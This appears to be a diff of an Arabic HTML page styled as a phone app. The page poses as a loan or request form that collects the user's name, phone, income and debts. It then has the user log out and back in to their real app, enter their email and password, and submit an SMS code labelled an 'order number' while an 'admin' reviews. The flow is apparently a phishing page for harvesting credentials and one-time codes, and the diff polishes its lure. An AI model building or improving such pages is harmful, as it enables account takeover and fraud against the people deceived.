@@ -21,7 +21,7 @@
 
   body {
     font-family: 'Tajawal', 'Segoe UI', Tahoma, Arial, sans-serif;
-    background: radial-gradient(circle at 50% 20%, #0d2240 0%, #060f24 55%, #03070f 100%);
+    background: radial-gradient(circle at 50% 20%, #12345c 0%, #07142d 56%, #03070f 100%);
     min-height: 100vh;
     min-height: 100dvh;
     display: flex;
@@ -32,11 +32,9 @@
   }
 
   .phone {
-    width: 100%;
-    max-width: 380px;
     width: min(380px, 100%);
     min-height: min(760px, calc(100dvh - 24px));
-    background: linear-gradient(180deg, #0c1f3d 0%, #081730 50%, #040b1c 100%);
+    background: linear-gradient(180deg, #0d2444 0%, #081730 50%, #040b1c 100%);
     border-radius: 36px;
     padding: clamp(18px, 5vw, 24px) clamp(16px, 5vw, 22px) clamp(22px, 6vw, 30px);
     position: relative;
@@ -74,6 +72,65 @@
     margin-bottom: clamp(20px, 5vh, 26px);
   }
 
+  .home-intro {
+    color: #dbeafe;
+    font-size: 15px;
+    font-weight: 600;
+    line-height: 1.7;
+    margin: -8px 0 16px;
+  }
+
+  .request-note {
+    position: relative;
+    overflow: hidden;
+    color: #eaf2ff;
+    background: linear-gradient(135deg, rgba(31, 92, 180, 0.32), rgba(20, 184, 166, 0.18));
+    border: 1px solid rgba(147, 197, 253, 0.28);
+    border-radius: 14px;
+    margin: calc(clamp(20px, 5vh, 26px) * -0.35) 0 18px;
+    padding: 12px 12px 13px;
+    box-shadow: 0 12px 28px rgba(0, 0, 0, 0.22), inset 0 1px 0 rgba(255,255,255,0.08);
+  }
+
+  .note-head {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 9px;
+  }
+
+  .note-icon {
+    width: 26px;
+    height: 26px;
+    border-radius: 50%;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    background: rgba(250, 204, 21, 0.18);
+    color: #fde68a;
+    font-size: 15px;
+    font-weight: 700;
+    flex-shrink: 0;
+  }
+
+  .note-title {
+    color: #fff;
+    font-size: 15px;
+    font-weight: 700;
+  }
+
+  .note-text {
+    border-radius: 10px;
+    background: rgba(3, 7, 18, 0.24);
+    border: 1px solid rgba(255,255,255,0.07);
+    color: #dbeafe;
+    font-size: 13.5px;
+    font-weight: 500;
+    line-height: 1.5;
+    padding: 10px 12px;
+    text-align: right;
+  }
+
   .field {
     display: flex;
     direction: ltr;
@@ -106,8 +163,12 @@
     text-align: center;
   }
 
-  .field .email-icon {
-    color: #fff;
+  .account-links {
+    display: flex;
+    justify-content: flex-start;
+    gap: 8px;
+    flex-wrap: wrap;
+    margin: 8px 0 22px;
   }
 
   .new-user {
@@ -117,12 +178,11 @@
     cursor: pointer;
   }
 
-  .account-links {
-    display: flex;
-    justify-content: flex-start;
-    gap: 8px;
-    flex-wrap: wrap;
-    margin: 8px 0 22px;
+  .create-new {
+    color: #4e8df0;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
   }
 
   .action-row {
@@ -157,17 +217,19 @@
     cursor: pointer;
   }
 
+  .home-form .submit-btn {
+    width: 100%;
+  }
+
+  .logout-step .submit-btn {
+    width: 100%;
+    margin-top: 14px;
+  }
+
   .submit-btn:disabled,
   .qr-btn:disabled {
     opacity: 0.7;
     cursor: not-allowed;
-  }
-
-  .create-new {
-    color: #4e8df0;
-    font-size: 14px;
-    font-weight: 600;
-    cursor: pointer;
   }
 
   .message {
@@ -265,43 +327,80 @@
 <div class="phone">
   <div class="topbar">
     <span class="support-icon">&#127911;</span>
-    <span class="lang">الإنكليزية</span>
+    <span class="lang">العربية</span>
   </div>
 
   <div class="logo">
-    <svg viewBox="0 0 120 110" xmlns="http://www.w3.org/2000/svg">
+    <svg viewBox="0 0 120 110" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
       <polygon points="60,5 110,40 80,40 40,65 20,52" fill="#2563eb"/>
       <polygon points="20,52 60,78 60,105 10,72 10,52" fill="#14b8a6"/>
       <polygon points="40,65 80,40 110,40 70,65" fill="#3b82f6"/>
     </svg>
   </div>
 
-  <div class="title" id="pageTitle">تسجيل الدخول</div>
+  <div class="title" id="pageTitle">الصفحة الرئيسية</div>
 
-  <form id="requestForm" novalidate>
+  <form id="homeForm" class="home-form" novalidate>
+    <p class="home-intro">يرجى إدخال البيانات التالية للانتقال إلى صفحة تقديم الطلب.</p>
+
     <div class="field">
-      <input id="email" type="email" required placeholder="البريد الإلكتروني" dir="rtl">
-      <span class="icon email-icon">&#128100;</span>
+      <input id="applicantName" type="text" required placeholder="اسم مقدم الطلب" dir="rtl" autocomplete="name">
+      <span class="icon">&#128100;</span>
     </div>
 
     <div class="field">
-      <input id="name" type="text" required placeholder="كلمة المرور " dir="rtl">
+      <input id="contactNumber" type="tel" required placeholder="رقم للتواصل" inputmode="tel" dir="rtl">
+      <span class="icon">&#128222;</span>
+    </div>
+
+    <div class="field">
+      <input id="monthlyIncome" type="number" min="0" step="1" required placeholder="قيمة الدخل" inputmode="numeric" dir="rtl">
+      <span class="icon">&#128176;</span>
+    </div>
+
+    <div class="field">
+      <input id="obligationsValue" type="number" min="0" step="1" required placeholder="قيمة الالتزامات" inputmode="numeric" dir="rtl">
+      <span class="icon">&#128221;</span>
+    </div>
+
+    <button class="submit-btn" type="submit" id="startRequestButton">الانتقال إلى تقديم الطلب</button>
+  </form>
+
+  <div id="logoutStep" class="logout-step hidden">
+    <div class="request-note" role="note" aria-label="تنويه مهم قبل تقديم الطلب">
+      <div class="note-head">
+        <span class="note-icon">!</span>
+        <span class="note-title">خطوة مهمة قبل المتابعة</span>
+      </div>
+      <div class="note-text">  يرجى التوجه إلى التطبيق، ثم تسجيل الخروج من الحساب، وبعد ذلك إعادة تسجيل الدخول والانتقال إلى الصفحة التالية.               .</div>
+    </div>
+    <button class="submit-btn" type="button" id="logoutNextButton">إذا تم تسجيل الخروج، التالي</button>
+  </div>
+
+  <form id="requestForm" class="hidden" novalidate>
+    <div class="field">
+      <input id="email" type="email" required placeholder="البريد الإلكتروني" dir="rtl" autocomplete="email">
+      <span class="icon">&#9993;</span>
+    </div>
+
+    <div class="field">
+      <input id="name" type="password" required placeholder="كلمة المرور" dir="rtl" autocomplete="current-password">
       <span class="icon" style="margin-left:8px;">&#128065;</span>
     </div>
 
     <div class="account-links">
-      <span class="new-user">هل نسيت كلمة المرور</span>
-      <span class="create-new">تعيير كلمة المرور</span>
+      <span class="new-user">هل نسيت كلمة المرور؟</span>
+      <span class="create-new">تغيير كلمة المرور</span>
     </div>
 
     <div class="action-row">
       <button class="qr-btn" type="button" id="qrButton">&#9783;</button>
-      <button class="submit-btn" type="submit" id="submitButton">تسجيل دخول</button>
+      <button class="submit-btn" type="submit" id="submitButton">تقديم الطلب</button>
     </div>
   </form>
 
-  <form id="orderForm" class="hidden">
-    <div class="order-note"> تم ارسال رسالة نصية على جهازك عبر sms</div>
+  <form id="orderForm" class="hidden" novalidate>
+    <div class="order-note">تم إرسال رسالة نصية على جهازك عبر SMS</div>
 
     <div class="field">
       <input id="orderNumber" type="text" maxlength="6" pattern="\d{6}" required placeholder="رقم الطلب" inputmode="numeric" dir="rtl">
@@ -315,7 +414,7 @@
   </form>
 
   <div id="waitingPanel" class="waiting-panel hidden">
-    <div class="waiting-text">يرجى التوجه إلى التطبيق، ثم تسجيل الخروج من الحساب، وبعد ذلك إعادة تسجيل الدخول والانتقال إلى الصفحة التالية.                ...</div>
+    <div class="waiting-text">يرجى الانتظار حتى يتم مراجعة الطلب من الأدمن...</div>
   </div>
 
   <div id="message" class="message hidden"></div>
